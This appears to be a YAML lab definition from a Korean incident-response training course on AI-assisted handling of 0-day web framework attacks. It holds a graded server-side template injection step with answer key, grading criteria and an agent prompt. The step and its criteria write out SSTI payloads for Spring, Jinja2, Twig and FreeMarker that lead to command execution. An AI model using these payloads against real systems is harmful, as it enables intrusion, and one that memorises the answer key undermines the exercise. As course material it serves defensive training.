lab_id: agent-ir-adv-ai-week05
title: 0-day 웹 프레임워크 자동 악용 IR (AI 지원)
version: ai
course: agent-ir-adv-ai
week: 5
description: 에이전트가 공개 소스 → 취약점 후보 → PoC 생성. 시그니처 없는 탐지 + RASP + SDLC 통합. AI SubAgent
  자동 실행·검증.
difficulty: hard
duration_minutes: 150
objectives:
- 공격 원리를 이해하고 재현한다
- 탐지·분석·초동대응·보고·재발방지의 6단계를 수행한다
- Human vs Agent 대응을 비교한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: SSTI 페이로드 시뮬
  hint: 6단계 IR 중 공격 단계. target_vm=web.
  category: attack
  points: 9
  answer: '🤖 프롬프트: SSTI 페이로드 시뮬

    📎 참고 (CLI): echo ''${T(java.lang.Runtime).getRuntime().exec("id")}'' > /tmp/w05-ssti.txt
    && cat /tmp/w05-ssti.txt'
  answer_detail: '[공격] Spring SSTI 예.'
  verify:
    type: output_contains
    expect: Runtime
    field: stdout
    semantic:
      intent: 'SSTI 페이로드 시뮬 — Jinja2: {{config.items()}} · Twig: {{_self.env.registerUndefinedFilterCallback(system)}}
        · FreeMarker: <#assign ex=Execute?new()>. 3 엔진 템플릿 주입. 0-day 수준'
      success_criteria:
      - SSTI 3 엔진 페이로드
      - Jinja2/Twig/FreeMarker
      acceptable_methods:
      - curl + 페이로드
      negative_signs:
      - SSTI 개념 없음
  target_vm: web
  script: echo '${T(java.lang.Runtime).getRuntime().exec("id")}' > /tmp/w05-ssti.txt
    && cat /tmp/w05-ssti.txt
  risk_level: low
  bastion_prompt: 'SSTI 페이로드 시뮬


    [중요] 반드시 제시된 쉘 명령을 실제로 실행하고 실제 stdout 기반으로 답해라. 개념 설명·표·체크리스트만 출력 금지.'
